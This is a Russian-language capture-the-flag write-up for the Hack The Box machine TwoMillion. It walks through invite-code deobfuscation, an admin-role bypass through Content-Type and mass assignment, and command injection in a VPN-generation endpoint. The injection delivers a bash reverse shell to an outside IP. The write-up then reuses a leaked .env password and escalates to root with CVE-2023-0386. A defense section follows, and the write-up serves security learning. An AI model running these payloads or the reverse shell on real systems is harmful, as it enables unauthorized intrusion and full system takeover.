# TwoMillion

| | |
|---|---|
| **Платформа / Событие** | hackthebox |
| **Категория** | web |
| **Сложность** | Easy |
| **Дата решения** | 20.11.2026 |
| **Ссылка на таск** | — |

## TL;DR

Классическая веб-цепочка: инвайт-код добывается через обфусцированный JS
(packer + base64 + ROT13), на `/api/v1` есть админ-эндпоинты, авторизация в
которых проверяется только в JSON-ветке маршрута — PUT с
`Content-Type: application/x-www-form-urlencoded` и полем `is_admin` даёт
массовое присвоение роли админа. Админ-эндпоинт генерации VPN-конфига
конкатенирует `username` в shell-команду -> RCE. В webroot лежит `.env` с
паролем БД, который переиспользуется локальным пользователем `admin` -> user
flag. PE — CVE-2023-0386 (OverlayFS + FUSE, ядро 5.15.70) -> root flag.

## Recon

- `nmap -sV -sC 10.129.229.66` → **2 открытых TCP-порта**: 22 (SSH) и 80 (HTTP, nginx).
- Порт 80 отвечает редиректом/контентом на `2million.htb` → добавляем в `/etc/hosts`:

```bash
echo "10.129.229.66 2million.htb" | sudo tee -a /etc/hosts
```

- На главной — лендинг HTB-клона с кнопками Login/Register. Страница `/invite`
  подгружает `/js/inviteapi.min.js` (Task 2).

## Steps

### 1. Обфусцированный JS: inviteapi.min.js

Файл упакован в формат **Dean Edwards packer** — классическая сигнатура:

```js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)}; ... }('...',62,120,'...'.split('|'),0,{}))
```

Распаковка в консоли браузера: открыть `/js/inviteapi.min.js` целиком как
скрипт (обернуть его в `alert(p)` вместо `eval`), либо вставить в
beautifier/packer-decoder. После распаковки видны **три функции**:

```js
function makeInviteCode() {
    $.ajax({
        type: "POST",
        url: "/api/v1/invite/generate",
        success: function (data) { ... }
    });
}

function verifyInviteCode(code) {
    $.ajax({
        type: "POST",
        url: "/api/v1/invite/verify",
        data: { invite_code: code },
        ...
    });
}

function registerInviteCode() { /* register + invite_code */ }
```

`makeInviteCode` делает `POST /api/v1/invite/generate`, сервер отвечает:

```json
{"status":200,"success":true,"type":"base64","data":"RXJyb3IuLi4="}
```

### 2. Расшифровка подсказки: base64 → ROT13

Task 3–4: декодируем `data` из base64 → получаем **ROT13-текст**, который
указывает на следующий эндпоинт:

```
"Va beqre gb ... make a POST request to /api/v1/invite/how/to/generate"
```

```
echo "<base64>" | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

### 3. Получение инвайт-кода

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate
```

Ответ содержит `code`, закодированный **base64** — декодируем, это и есть
инвайт-код для регистрации.

### 4. Регистрация и осмотр авторизованной зоны

`POST /api/v1/user/register` с `username`, `email`, `password`, `invite_code`.
После логина открывается дашборд, в нём раздел **API** — Swagger-подобная
документация. Список всех маршрутов отдаёт сам API:

```bash
curl -s http://2million.htb/api/v1 -H "Authorization: Bearer <token>" | jq
```

Админ-эндпоинты (`/api/v1/admin/settings/update`, `/api/v1/admin/vpn/generate`,
`/api/v1/admin/settings` — всего 3, Task 6) отвечают `403 Forbidden`.

### 5. Bypass авторизации: Content-Type (mass assignment)

Ключевая деталь машины. Маршрут `PUT /api/v1/admin/settings/update` обрабатывает
и JSON, и form-encoded тело, но **проверка роли выполняется только в JSON-ветке**.
Сменяем `Content-Type` и отправляем тело как form-data — до обхода проверка не
доходит:

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'email=<наш_email>&is_admin=1'
```

Значение `is_admin` читается из тела запроса — **mass assignment**: клиент
присваивает себе роль. Перезахватываем токен (или перелогиниваемся) — эндпоинты
`/api/v1/admin/*` отвечают 200.

### 6. RCE: командная инъекция в vpn/generate

`PUT /api/v1/admin/vpn/generate` генерирует `.ovpn`-конфиг, подставляя `username`
в shell-команду через конкатенацию:

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/vpn/generate \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin; id"}'
```

Вывод команды возвращается прямо внутри ответа (в теле «сгенерированного»
конфига). Реверс-шелл — через base64, чтобы не мучиться с кавычками и
парами `;`/`&` в JSON:

```bash
echo -n 'bash -i >& /dev/tcp/10.10.17.4/4444 0>&1' | base64
# payload: {"username":"admin; echo <b64> | base64 -d | bash"}
```

Получаем шелл от `www-data`.

### 7. .env → креды → user flag

В webroot (`/var/www/html/`) лежит `.env` (Task 9 — типичное хранилище
переменных окружения PHP-приложений):

```
DB_HOST=localhost
DB_DATABASE=2million
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Локальный пользователь `admin` использует тот же пароль:

```bash
su admin    # SuperDuperPass123
cat /home/admin/user.txt
```

### 8. Root: CVE-2023-0386 (OverlayFS + FUSE)

Ядро `5.15.70` (Task 12 указывает на 2023 CVE с Overlay-файлсистемой и
сохранением метаданных/SetUID при перемещении файлов). PoC:
<https://github.com/xkaneiki/CVE-2023-0386>.

Сборка на Parrot (`apt install libfuse-dev libcap-dev`; в новых GCC нужно
`-Wno-implicit-function-declaration` или `#include <unistd.h>`). На таргет —
только бинарники: `scp -r exp fuse gc ovlcap admin@2million.htb:/tmp/cve0386/`.

Запуск в **двух сессиях** (порядок важен: `fuse` держит mount, пока работает
`exp`):

```bash
# терминал 1 — FUSE-монтирование с «переносом» setuid-файла
./fuse ./ovlcap/lower ./gc

# терминал 2 — OverlayFS copy-up + запуск файла с унаследованными cap'ами
./exp
# [+] exploit success! → root shell
cat /root/root.txt
```

### 9. Альтернативный privesc: Looney Tunables (CVE-2023-4911)

Task 14–16: `ldd --version` → **glibc 2.35**. Уязвимость — переполнение буфера
в обработке `GLIBC_TUNABLES` в динамическом линкере (`ld.so`); локальный
пользователь подбирает строку тюнинг-переменной так, чтобы переполнение
перезаписало структуру с указателями и получило shell от root. PoC — blasty/CVE-2023-4911.
(На момент решения пройден только основной путь; альтернативный зафиксирован
по вопросам тасков.)

## Why it works

Три самостоятельных нарушения доверия, каждое фатально по отдельности:

1. **Секрет на клиенте.** Логика выдачи инвайт-кода полностью живёт в JS на
   стороне браузера: имена эндпоинтов, способ шифрования подсказки — всё
   читаемо. Сервер лишь оформляет это как «загадку». Класс: *security through
   obscurity* — клиентская часть всегда недоверенная.
2. **Проверка роли, привязанная к парсеру.** Авторизация на админ-маршруте
   не была middleware — она исполнялась в ветке парсинга JSON. Приложение
   доверяло заголовку `Content-Type` как маркеру «этот запрос уже прошёл
   проверку». Это класс: *broken access control* + *mass assignment* — клиент
   управляет и форматом запроса (обход проверки), и значением `is_admin`
   (повышение).
3. **Доверие пользовательскому вводу в exec.** `username` конкатенируется в
   строку shell-команды. Класс: *OS command injection*.

Усилители цепочки:

- `.env` в webroot — секрет доступен из RCE как обычный файл;
- **переиспользование пароля** между БД и системной учёткой `admin` —
  утечка одного секрета даёт две плоскости;
- непропатченное ядро 5.15.70 — известные локальные privesc живут месяцами.

## Defense

1. **Авторизация — только middleware/per-request.** Роль проверяется по
   объекту сессии до входа в обработчик, независимо от Content-Type и формата
   тела. Массовое присвоение закрывается whitelist'ом полей (Doctrine/Symfony
   `form.fields`, Laravel `$fillable`, serializers с `read_only_fields`).
2. **Никаких shell-строк.** Запуск внешних команд — через список аргументов
   без shell (`subprocess.run([...], shell=False)`, `execve`), ввод — как
   аргумент, а не как фрагмент строки. Если оболочка неизбежна —
   `escapeshellarg` + whitelist символов.
3. **Секреты вне webroot и без переиспользования.** `.env` — вне документ-рута
   и вне git; пароль БД ≠ пароль системной учётки; для передачи секретов
   процессу — окружение/секрет-менеджер, а не файл в директории сервера.
4. **Патч-гигиена ядра.** CVE-2023-0386 закрыта в апрельских апдейтах 2023
   (Ubuntu 22.04, 5.15.0-72+). Регулярный unattended-upgrades закрывает весь
   класс локальных privesc через известные CVE.

## References

- [0xdf: TwoMillion HTB writeup](https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html)
- [NVD: CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386)
- [xkaneiki/CVE-2023-0386 PoC](https://github.com/xkaneiki/CVE-2023-0386)
- [blasty/CVE-2023-4911 (Looney Tunables)](https://github.com/blasty/CVE-2023-4911)
- [OWASP: Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [OWASP: OS Command Injection Defense](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [PortSwigger: Access control vulnerabilities](https://portswigger.net/web-security/access-control)
- [JS Deobfuscator](https://thanhle.io.vn/de4js/)

